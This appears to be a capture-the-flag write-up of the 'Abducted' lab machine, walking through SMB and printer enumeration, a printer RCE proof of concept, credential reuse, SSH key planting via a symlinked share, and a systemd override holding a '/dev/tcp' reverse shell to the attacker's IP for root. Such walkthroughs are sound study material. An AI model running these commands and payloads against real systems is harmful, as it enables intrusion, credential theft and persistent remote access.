---
layout: default
title: "Abducted"
---

# Abducted

## Box Info

<table>
  <tr>
    <td width="40%">
      <img src="box.png" alt="Abducted">
    </td>
    <td width="60%">
      <table>
        <tr><td><strong>Release Date</strong></td><td>2026-06-05</td></tr>
        <tr><td><strong>OS</strong></td><td>Linux</td></tr>
        <tr><td><strong>Difficulty</strong></td><td>Medium</td></tr>
        <tr><td><strong>User Difficulty Rating</strong></td><td><img src="userdifficulty.png"></td></tr>
        <tr><td><strong>Star Rating</strong></td><td>★★★★ (4.6 / 5)</td></tr>
        <tr><td><strong>Creator</strong></td><td><a href="https://app.hackthebox.com/users/114053">TheCyberGeek</a>, </td><td><a href="https://app.hackthebox.com/users/389926">kavigihan</a></td></tr>
      </table>
    </td>
  </tr>
</table>

**Please note the following abbreviations:**
<br>LHOST - attacking box IP
<br>LPORT - local port
<br>RHOST - target IP
<br>RPORT - target port

## Enumeration and Foothold

```bash
sudo nmap -T4 -vv -Pn -p- RHOST
<snip>
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63
<snip>
```

I choose to run `-vv` in case interesting ports are open. In that case, I can continue enumeration while I wait for the rest of the scan to complete. I ran smbmap on the target, which found several shares I do not have access to. I decide to wait until the service scan completes to check version vulnerabilities.

Then, I run detailed scans on the open ports, plus a few closed ports to assist in OS detection.

```bash
sudo nmap -T4 -vv -Pn -sCV -O -p RPORTs RHOST

PORT    STATE  SERVICE     REASON         VERSION
18/tcp  closed msp         reset ttl 63
19/tcp  closed chargen     reset ttl 63
20/tcp  closed ftp-data    reset ttl 63
21/tcp  closed ftp         reset ttl 63
22/tcp  open   ssh         syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
<snip>
139/tcp open   netbios-ssn syn-ack ttl 63 Samba smbd 4
445/tcp open   netbios-ssn syn-ack ttl 63 Samba smbd 4
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -34s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ABDUCTED<00>         Flags: <unique><active>
|   ABDUCTED<03>         Flags: <unique><active>
|   ABDUCTED<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
<snip>
Nmap done: 1 IP address (1 host up) scanned in 18.24 seconds
           Raw packets sent: 29 (2.086KB) | Rcvd: 22 (1.594KB)
➜  ~
```

Port 22 is only vulnerable in a limited set of circumstances that do not seem to apply here, so I start with more likely footholds. I startw ith port 445 but find I do not have unauthenticated read or write access. Effectively, this is a dead end. I shift my focus to port 139.

```
➜  Abducted   rpcclient -U "" -N -p 139 "$RHOST"
rpcclient $> srvinfo
	ABDUCTED       Wk Sv PrQ Unx NT SNT Hartley Group Document Services
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03
rpcclient $> enumdomusers
user:[scott] rid:[0x3e8]
rpcclient $> enumdomgroups
rpcclient $> netshareenumall
netname: HP-Reception
	remark:	Reception printer
	path:	C:\var\spool\samba
	password:	
	current_users:	0
netname: projects
	remark:	Hartley Group Project Files
	path:	C:\srv\projects
	password:	
	current_users:	0
netname: transfer
	remark:	Staff file transfer
	path:	C:\srv\transfer
	password:	
	current_users:	0
netname: IPC$
	remark:	IPC Service (Hartley Group Document Services)
	path:	C:\tmp
	password:	
	current_users:	1
rpcclient $> enumprinters
	flags:[0x800000]
	name:[\\10.129.244.177\]
	description:[\\10.129.244.177\,,Reception printer]
	comment:[Reception printer]

rpcclient $> enumdrivers 3
rpcclient $> enumdrivers
rpcclient $> enumports
	Port Name:	[Samba Printer Port]
rpcclient $> getprinter "HP-Reception"
result was WERR_ACCESS_DENIED
rpcclient $> ^C

➜  Abducted smbclient -L $RHOST -N -p 139

	Sharename       Type      Comment
	---------       ----      -------
	HP-Reception    Printer   Reception printer
	projects        Disk      Hartley Group Project Files
	transfer        Disk      Staff file transfer
	IPC$            IPC       IPC Service (Hartley Group Document Services)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.129.244.177 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available


```

## User Flag

So, long enum results short, on this port I have the ability to enumerate the exposed system. I find a printer service and a reception printer. Printer services are often needlessly exposed and are overlooked. They can provide an excellent foothold into the system. Based on the information I gatherd, I find a PoC for RCE on this system. I download it and rename it rce.py. I test it against RHOST. I am using penelope as my revshell handler due to its ability to handle multiple sessions, automatic shell upgrades, and file transfers. I start penelope and trigger to PoC:

```
➜  Abducted python3 rce.py -P "HP-Reception" RHOST LHOST LPORT
[*] target   : 10.129.244.177 (\\10.129.244.177\HP-Reception)
[*] callback : 10.10.16.167:4444  (start a listener first: nc -lvnp 4444)
[+] print job submitted -- check your listener / out-of-band channel


# In another window:


[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 192.168.1.244 • 10.10.16.167
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => abducted 10.129.244.177 Linux-x86_64 👤 nobody(65534) 😍️ Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/abducted~10.129.244.177-Linux-x86_64/2026_11_22-20_44_19-610-nobody(65534).log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
nobody@abducted:/var/spool/samba$
```
Penelope successfully catches the shell for 'nobody' and I connect to the session. I had some difficulty getting my linux enum script running due to file write permissions. Instead of arguing with the script and restrictions, I started manually enumerating the box. A lot of noise was present, but some interesting things became apparent:

```
nobody@abducted:/var/spool/samba$ ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Jun  4 13:41 .
drwxr-xr-x 23 root   root   4096 Jun  4 13:41 ..
drwxr-x---  3 marcus marcus 4096 Jun  4 13:47 marcus
drwxr-x---  3 scott  scott  4096 Jun  4 13:47 scott
```

There are two users with shells on the system, marcus and scott. I also look for configuration and .bak files as they often contain passwords and other useful information for lateral movement and privesc. The list of files wasn't short, but I made my way through it. One file of interest and usefulness jumped out.

```
nobody@abducted:/var/spool/samba$ find / -name "*.conf" 2>/dev/null
<snip>
/opt/offsite-backup/rclone.conf
<snip>
nobody@abducted:/var/spool/samba$ cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
nobody@abducted:/var/spool/samba$
```
I found a sftp user for backup purposes and their password. I can use rclone to decode it.

```
➜  Abducted  rclone reveal "HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw"
<REDACTED>
```

### User Flag Obtained

This password is only for a service account, but *someone* created the account. Password reuse is common so I try it against the two users so I try the password for scott. 

```
nobody@abducted:/var/spool/samba$ su marcus
Password:
su: Authentication failure
nobody@abducted:/var/spool/samba$ su scott
Password:
scott@abducted:/var/spool/samba$ cat ~/user.txt
f<REDACTED>6
```

It is successful for scott, and I cat the user flag.

## Root Flag

Having gained a higher privileged account, I tried my enumeration script which worked this time. A few things stood out to me. The OS has several interesting CVEs, and some services were interesting. I started with the OS CVEs. They provide the shortest route to root and are quick to try. The OS CVEs were patched so I moved on to the services. I notice two interesting services running as root. They are connected to SAMBA print spoolers. Print spoolers often accept input from low privileged users. When ran as root, a low-privileged user can inject a file to be ran as root. This is an encouraging possible route to root.

My enumeration script found, amoung others, these two services:
```
<snip>
root  5321 ... /usr/libexec/samba/rpcd_spoolss
root  5327 ... /usr/libexec/samba/samba-bgqd
<snip>
```

These are printer-related processes that run as root. If I can find a way for one of these services to run malicious code I can have a shell as root. I started enumerating the shares and processes to find a way to make this happen. Of interest, I found:

```
scott@abducted:/var/spool/samba$ testparm -sv 2>/dev/null |
grep -Ei 'print command|printing|printcap|spool|path =|force user|guest account|follow symlinks|wide links'

allow insecure wide links = Yes
follow symlinks = Yes
wide links = No

path = /srv/projects
force user = marcus

path = /srv/transfer
wide links = Yes
```

I notice that allow insecure wide links = Yes with the forced user of marcus for the transfer share. Practically, this means that the user Marcus runs the services and can access info beyond this share. This makes sense for a 'transfer' share. Even better, follow symlinks = yes. I might be able to use Scott's shell to set up malicious symlinks that Marcus's process would follow. At this point, I am curious about Marcus and if this is useful or a rabbit trail. I enumerate what Marcus's account can do:


```
scott@abducted:/var/spool/samba$ echo '=== MARCUS IDENTITY ==='
id marcus
getent passwd marcus
getent group sudo adm docker lxd disk

echo '=== SUDO DELEGATION ==='
sudo -n -l -U marcus 2>&1
grep -RniE 'marcus|%sudo|%admin' /etc/sudoers /etc/sudoers.d 2>/dev/null

echo '=== SYSTEMD TRUST ==='
grep -RniE 'User=marcus|Group=marcus|/home/marcus|/srv/projects' \
  /etc/systemd/system /lib/systemd/system \
  /usr/lib/systemd/system 2>/dev/null

echo '=== MARCUS PROCESSES ==='
ps -u marcus -o user,pid,ppid,args ww
=== MARCUS IDENTITY ===
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
<snip>
```

Marcus is in the operators group. This is an atypical group and I look at its privileges.

```
scott@abducted:/var/spool/samba$ echo '=== GROUP MEMBERS ==='
getent group operators

echo '=== GROUP-OWNED FILES AND DIRECTORIES ==='
find /etc /opt /srv /usr/local /var \
  -group operators -printf '%M %u:%g %p\n' 2>/dev/null

echo '=== GROUP ACL ENTRIES ==='
getfacl -R -p /srv /opt /usr/local/bin 2>/dev/null |
grep -B 5 -A 5 'group:operators:'

echo '=== PRIVILEGE DELEGATION ==='
grep -Rni 'operators' \
  /etc/polkit-1 /etc/security /etc/systemd \
  /etc/sudoers.d /usr/local/bin /opt 2>/dev/null
=== GROUP MEMBERS ===
operators:x:1000:marcus
=== GROUP-OWNED FILES AND DIRECTORIES ===
drwxrws--- root:operators /etc/systemd/system/smbd.service.d
=== GROUP ACL ENTRIES ===
=== PRIVILEGE DELEGATION ===
/etc/security/group.conf:41:#     With netgroups no wildcards or logic operators are allowed.
```
Marcus is the only member of operators. Interestingly, the operators group owns /etc/systemd/system.smbd.service.d, as does root. This is the exat overlap I was hoping to find. Marcus has overlapping rights with root within the smbd system. Earlier I found that the transfer share allows for symlinks and beyond-share file manipulation - all ran under Marcus. I set up the exploit with a symlink and malicious file.

```
# The malicious file
➜  Abducted cat > override.conf <<'EOF'
[Service]
ExecStartPre=+/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.167/4444 0>&1'
EOF
```

```
# The symlink
scott@abducted:/var/spool/samba$ ln -s /etc/systemd/system/smbd.service.d /srv/transfer/systemd
```

```
# Uploaded the override test file
➜  Abducted smbclient "//$RHOST/transfer" -U 'scott%iXzvcib3SrpZ' \
  -c 'put override.conf systemd/override.conf'
```
I confirmed the file was in the system with `smbclient "//$RHOST/transfer" -U 'scott%iXzvcib3SrpZ' \
  -c 'put override.conf systemd/override.conf'`. I tried to restart the daemon as scott but didn't have permissions. I tried to pull a ssh credential from Marcus, but was unsuccessful. I shfited and tried to plant a ssh credential for Marcus.

I created the key then tried to upload it via smb.

```
➜  Abducted ssh-keygen -t ed25519 -f ./marcus_htb -N ''\n\nsmbclient "//$RHOST/transfer" -U 'scott%iXzvcib3SrpZ' \\n  -c 'mkdir marcushome/.ssh; put marcus_htb.pub marcushome/.ssh/authorized_keys'
➜  Abducted smbclient "//$RHOST/transfer" -U 'scott%iXzvcib3SrpZ' \\n  -c 'mkdir marcushome/.ssh; put marcus_htb.pub marcushome/.ssh/authorized_keys'
➜  Abducted chmod 600 ./marcus_htb
```
The attempt was successful and I was able to use ssh to connect as Marcus. I tried to restart the daemon and was successful.

```
➜  Abducted ssh -i ./marcus_htb -o IdentitiesOnly=yes marcus@"$RHOST"
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)

<snip>

marcus@abducted:~$ ls
marcus@abducted:~$ systemctl daemon-reload && systemctl restart smbd.service
```
### Root Flag Obtained
I checked my Penelope listener and found a shell for root.

```

[+] [New Reverse Shell] => abducted 10.129.244.177 Linux-x86_64 👤 root(0) 😍️ Session ID <3>
(Penelope)> sessions

➤  abducted 10.129.244.177 Linux-x86_64

    ID  | Shell | User    | Source
    <3> | Raw   | root(0) | TCPListener(0.0.0.0:4444)

(Penelope)> interact 3
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [3] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/abducted~10.129.244.177-Linux-x86_64/2026_11_22-22_48_14-769-root(0).log
───────────────────────────────────────────────────────────────────────────────────────────────────────
root@abducted:/# cat /root/root.txt
<REDACTED>
```
With the root shell, I cat /root/root.txt and obtained the root flag.
